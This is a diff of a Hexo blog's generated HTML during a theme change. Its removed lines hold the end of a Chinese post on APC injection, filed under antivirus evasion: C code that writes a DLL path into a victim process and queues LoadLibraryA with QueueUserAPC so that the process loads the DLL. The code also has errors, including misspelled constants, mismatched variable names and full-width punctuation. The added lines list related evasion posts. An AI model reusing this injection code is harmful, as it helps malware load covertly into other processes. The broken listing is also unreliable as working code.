class="line">LPVOID pVirAddr = VirtualAllocEx(victimProcess,NULL,DllPathSize,NULL,MEM_COMMIT,PAGE_READWRITE);</span><br><span class="line">if (NULL == pVirAddr)&#123;</span><br><span class="line">    printf(&quot;VirtualAllocEx Error:%d\n&quot;,GetLastError());</span><br><span class="line">    CloseHandle(victimProcess);</span><br><span class="line">    CloseHandle(threadHandle);</span><br><span class="line">     return 1;</span><br><span class="line">&#125;</span><br><span class="line">//将Dll路径写入目标进程</span><br><span class="line">if(!WriteProcessMemory(victimProcess,pVirAddr,DllPath,DllPathSize,NULL))&#123;</span><br><span class="line">    printf(&quot;WriteProcessMemory Error:%d\n&quot;,GetLastError());</span><br><span class="line">    VirtualFreeEx(victimProcess,pVirAddr,0,MEM_RELEASE);</span><br><span class="line">CloseHandle(victimProcess);</span><br><span class="line">  CloseHandle(threadHandle);</span><br><span class="line">  return 1；</span><br><span class="line">&#125;</span><br><span class="line">//获取LoadLibraryA的函数地址</span><br><span class="line">FARPROC pFunAddr = GetProcAddress(GetModuleHandle(&quot;kernel32.dll&quot;),&quot;LoadLibraryA&quot;);</span><br><span class="line">if(NULL == pFuncAddr)&#123;</span><br><span class="line">    printf(&quot;GetProcAddress Error:%d\n&quot;,GetLastError());</span><br><span class="line">    VirtualFreeEx(victimProcess,pVirAddr,0,MEM_RELESE);</span><br><span class="line">    CloseHandle(victimProcess);</span><br><span class="line">    CloseHandle(victimProcess);</span><br><span class="line">    return 1;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">//将APC添加到线程的APC队列</span><br><span class="line">if(!QueueUserAPC((PAPCFUNC)pFunAddr,threadHandle,(ULONG_STR)pVirAddr))&#123;</span><br><span class="line">    printf(&quot;QueueUserAPC Error:%d\n&quot;,GetLastError()); VirtualFreeEx(victimProcess,pVirAddr,0,MEM_RELESE);</span><br><span class="line">    CloseHandle(victimProcess);</span><br><span class="line">    CloseHandle(victimProcess);</span><br><span class="line">    return 1;</span><br><span class="line">&#125;</span><br><span class="line">//恢复线程以执行APC</span><br><span class="line">ResumeThread(threadHandle);</span><br><span class="line">//等待一定时间以确保dll加载完成</span><br><span class="line">Sleep（10000）；</span><br><span class="line"></span><br><span class="line">    TerminateProcess(victimProcess,0)；</span><br><span class="line">    VirtualFreeEx(victimProcess,pVirAddr,0,MEM_RELESE);</span><br><span class="line">   CloseHandle(victimProcess);</span><br><span class="line">    CloseHandle(threadHandle);</span><br><span class="line">  return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-
-      
-    </div>
-    <footer class="article-footer">
-      <a data-url="http://example.com/2024/10/08/%E5%85%8D%E6%9D%80/APC%E6%B3%A8%E5%85%A5/" data-id="cm1zwlrfg0000u0v60b2c278g" data-title="" class="article-share-link"><span class="fa fa-share">Share</span></a>
-      
-      
-      
-    </footer>
-  </div>
-  
-</article>
-
-
-
-  
-    <article id="post-test" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
-  <div class="article-meta">
-    <a href="/2024/09/23/test/" class="article-date">
-  <time class="dt-published" datetime="2024-09-23T05:22:31.652Z" itemprop="datePublished">2024-09-23</time>
-</a>
-    
-  </div>
-  <div class="article-inner">
-    
-    
-    <div class="e-content article-entry" itemprop="articleBody">
-      
-        <h1 id="hello"><a href="#hello" class="headerlink" title="hello"></a>hello</h1>
-      
-    </div>
-    <footer class="article-footer">
-      <a data-url="http://example.com/2024/09/23/test/" data-id="cm1ekajnx00009cv64llg66em" data-title="" class="article-share-link"><span class="fa fa-share">Share</span></a>
-      
-      
-      
-    </footer>
-  </div>
-  
-</article>
-
-
-
-  
-    <article id="post-hello-world" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
-  <div class="article-meta">
-    <a href="/2024/09/23/hello-world/" class="article-date">
-  <time class="dt-published" datetime="2024-09-23T05:09:26.669Z" itemprop="datePublished">2024-09-23</time>
-</a>
-    
-  </div>
-  <div class="article-inner">
-    
-    
-      <header class="article-header">
         
+        <section id="about">
   
-    <h1 itemprop="name">
-      <a class="p-name article-title" href="/2024/09/23/hello-world/">Hello World</a>
-    </h1>
-  
-
-      </header>
+  <p style="display: inline">
     
-    <div class="e-content article-entry" itemprop="articleBody">
-      
-        <p>Welcome to <a target="_blank" rel="noopener" href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a target="_blank" rel="noopener" href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a target="_blank" rel="noopener" href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a target="_blank" rel="noopener" href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p>
-<h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo new <span class="string">&quot;My New Post&quot;</span></span><br></pre></td></tr></table></figure>
-
-<p>More info: <a target="_blank" rel="noopener" href="https://hexo.io/docs/writing.html">Writing</a></p>
-<h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure>
-
-<p>More info: <a target="_blank" rel="noopener" href="https://hexo.io/docs/server.html">Server</a></p>
-<h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure>
-
-<p>More info: <a target="_blank" rel="noopener" href="https://hexo.io/docs/generating.html">Generating</a></p>
-<h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure>
-
-<p>More info: <a target="_blank" rel="noopener" href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>
-
-      
-    </div>
-    <footer class="article-footer">
-      <a data-url="http://example.com/2024/09/23/hello-world/" data-id="cm1ejt1930000q8v61q00bql9" data-title="Hello World" class="article-share-link"><span class="fa fa-share">Share</span></a>
-      
-      
-      
-    </footer>
-  </div>
-  
-</article>
-
-
-
-  
-
-
-  <nav id="page-nav">
+      Find me on
+      <ul id="socialinfo">
+        
+          <li><a class="icon" target="_blank" href="http://github.com/sergodeeva"><i class="fa fa-github"></i></a></li>
+        
+          <li><a class="icon" target="_blank" href="/"><i class="fa fa-facebook"></i></a></li>
+        
+          <li><a class="icon" target="_blank" href="https://www.linkedin.com/in/natalyakosenko/"><i class="fa fa-linkedin"></i></a></li>
+        
+      </ul>.
     
-    <a class="extend prev" rel="prev" href="/page/2/">&laquo; Prev</a><a class="page-number" href="/">1</a><a class="page-number" href="/page/2/">2</a><span class="page-number current">3</span>
-  </nav>
-
+  </p>
 </section>
+
+<section id="writing">
+  <span class="h1"><a href="/posts">Writing</a></span>
+  <ul class="post-list">
+    
+      
+    
+    
+      <li class="post-item">
         
-          <aside id="sidebar">
-  
-    
-
-  
-    
-
-  
-    
-  
-    
-  <div class="widget-wrap">
-    <h3 class="widget-title">Archives</h3>
-    <div class="widget">
-      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2024/10/">October 2024</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2024/09/">September 2024</a></li></ul>
+    <div class="meta">
+        <time datetime="2024-10-08T07:34:43.953Z" itemprop="datePublished">2024-10-08</time>
     </div>
-  </div>
 
 
-  
+        <span>
     
-  <div class="widget-wrap">
-    <h3 class="widget-title">Recent Posts</h3>
-    <div class="widget">
+        <a class="" href="/2024/10/08/APC%E6%B3%A8%E5%85%A5/">APC 注入</a>
+    
+
+
+</span>
+      </li>
+    
+      <li class="post-item">
+        
+    <div class="meta">
+        <time datetime="2024-10-08T03:50:54.570Z" itemprop="datePublished">2024-10-08</time>
+    </div>
+
+
+        <span>
+    
+        <a class="" href="/2024/10/08/%E9%9A%90%E8%97%8F%E5%AF%BC%E5%85%A5%E8%A1%A8/">Untitled</a>
+    
+
+
+</span>
+      </li>
+    
+      <li class="post-item">
+        
+    <div class="meta">
+        <time datetime="2024-10-08T03:50:54.569Z" itemprop="datePublished">2024-10-08</time>
+    </div>
+
+
+        <span>
+    
+        <a class="" href="/2024/10/08/%E8%BF%9B%E7%A8%8B%E5%BC%BA%E6%9D%80/">Untitled</a>
+    
+
+
+</span>
+      </li>
+    
+      <li class="post-item">
+        
+    <div class="meta">
+        <time datetime="2024-10-08T03:50:54.568Z" itemprop="datePublished">2024-10-08</time>
+    </div>
+
+
+        <span>
+    
+        <a class="" href="/2024/10/08/%E8%BF%9B%E7%A8%8B%E5%92%8C%E7%BA%BF%E7%A8%8B/">Untitled</a>
+    
+
+
+</span>
+      </li>
+    
+      <li class="post-item">
+        
+    <div class="meta">
+        <time datetime="2024-10-08T03:50:54.567Z" itemprop="datePublished">2024-10-08</time>
+    </div>
+
+
+        <span>
+    
+        <a class="" href="/2024/10/08/%E8%B0%83%E8%AF%95/">Untitled</a>
+    
+
+
+</span>
+      </li>
+    
+      <li class="post-item">
+        
+    <div class="meta">
+        <time datetime="2024-10-08T03:50:54.566Z" itemprop="datePublished">2024-10-08</time>
+    </div>
+
+
+        <span>
+    
+        <a class="" href="/2024/10/08/%E7%86%B5%E4%B8%8E%E8%87%AA%E7%AD%BE%E5%90%8D/">Untitled</a>
+    
+
+
+</span>
+      </li>
+    
+      <li class="post-item">
+        
+    <div class="meta">
+        <time datetime="2024-10-08T03:50:54.565Z" itemprop="datePublished">2024-10-08</time>
+    </div>
+
+
+        <span>
+    
+        <a class="" href="/2024/10/08/%E6%B1%87%E7%BC%96/">Untitled</a>
+    
+
+
+</span>
+      </li>
+    
+      <li class="post-item">
+        
+    <div class="meta">
+        <time datetime="2024-10-08T03:50:54.564Z" itemprop="datePublished">2024-10-08</time>
+    </div>
+
+
+        <span>
+    
+        <a class="" href="/2024/10/08/%E5%86%85%E5%AD%98%E5%8A%A0%E8%BD%BD%E6%A3%80%E6%B5%8B/">Untitled</a>
+    
+
+
+</span>
+      </li>
+    
+      <li class="post-item">
+        
+    <div class="meta">
+        <time datetime="2024-10-08T03:50:54.563Z" itemprop="datePublished">2024-10-08</time>
+    </div>
+
+
+        <span>
+    
+        <a class="" href="/2024/10/08/Windows%E5%BC%82%E5%B8%B8/">Untitled</a>
+    
+
+
+</span>
+      </li>
+    
+      <li class="post-item">
+        
+    <div class="meta">
+        <time datetime="2024-10-08T03:50:54.562Z" itemprop="datePublished">2024-10-08</time>
+    </div>
+
+
+        <span>
+    
+        <a class="" href="/2024/10/08/Windows%E5%8F%8C%E6%9C%BA%E8%B0%83%E8%AF%95%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/">Untitled</a>
+    
+
+
+</span>
+      </li>
+    
+  </ul>
+  
+</section>
+
+
+
+    </div>
+    
+    <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy; 2024 John Doe
+  </div>
+  <div class="footer-right">
+    <nav>
       <ul>
-        
-          <li>
-            <a href="/2024/10/08/%E5%85%8D%E6%9D%80/%E9%9A%90%E8%97%8F%E5%AF%BC%E5%85%A5%E8%A1%A8/">(no title)</a>
-          </li>
-        
-          <li>
-            <a href="/2024/10/08/%E5%85%8D%E6%9D%80/%E8%BF%9B%E7%A8%8B%E5%BC%BA%E6%9D%80/">(no title)</a>
-          </li>
-        
-          <li>
-            <a href="/2024/10/08/%E5%85%8D%E6%9D%80/%E8%BF%9B%E7%A8%8B%E5%92%8C%E7%BA%BF%E7%A8%8B/">(no title)</a>
-          </li>
-        
-          <li>
-            <a href="/2024/10/08/%E5%85%8D%E6%9D%80/%E8%B0%83%E8%AF%95/">(no title)</a>
-          </li>
-        
-          <li>
-            <a href="/2024/10/08/%E5%85%8D%E6%9D%80/%E7%86%B5%E4%B8%8E%E8%87%AA%E7%AD%BE%E5%90%8D/">(no title)</a>
-          </li>
+         
+          <li><a href="/">Home</a></li>
+         
+          <li><a href="/about/">About</a></li>
+         
+          <li><a href="/posts/">Writing</a></li>
+         
+          <li><a target="_blank" rel="noopener" href="http://github.com/sergodeeva">Projects</a></li>
         
       </ul>
-    </div>
-  </div>
-
-  
-</aside>
-        
-      </div>
-      <footer id="footer">
-  
-  <div class="outer">
-    <div id="footer-info" class="inner">
-      
-      &copy; 2024 John Doe<br>
-      Powered by <a href="https://hexo.io/" target="_blank">Hexo</a>
-    </div>
+    </nav>
   </div>
 </footer>
 
-    </div>
-    <nav id="mobile-nav">
-  
-    <a href="/" class="mobile-nav-link">Home</a>
-  
-    <a href="/archives" class="mobile-nav-link">Archives</a>
-  
-</nav>
-    
-
-
-<script src="/js/jquery-3.6.4.min.js"></script>
-
-
-
-  
-<script src="/fancybox/jquery.fancybox.min.js"></script>
-
-
-
-
-<script src="/js/script.js"></script>
-
-
-
-
-
-  </div>
 </body>
 </html>
+<!-- styles -->
+
+<link rel="stylesheet" href="/lib/font-awesome/css/font-awesome.min.css">
+
+
+<link rel="stylesheet" href="/lib/meslo-LG/styles.css">
+
+
+<link rel="stylesheet" href="/lib/justified-gallery/justifiedGallery.min.css">
+
+
+<!-- jquery -->
+
+<script src="/lib/jquery/jquery.min.js"></script>
+
+
+<script src="/lib/justified-gallery/jquery.justifiedGallery.min.js"></script>
+
+
+<script src="/js/main.js"></script>
+
+
+
+    <!-- Google Analytics -->
+    <script type="text/javascript">
+        (function(i,s,o,g,r,a,m) {i['GoogleAnalyticsObject']=r;i[r]=i[r]||function() {
+        (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
+        m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
+        })(window,document,'script','//www.google-analytics.com/analytics.js','ga');
+        ga('create', 'UA-37473492-6', 'auto');
+        ga('send', 'pageview');
+    </script>
+
+
+
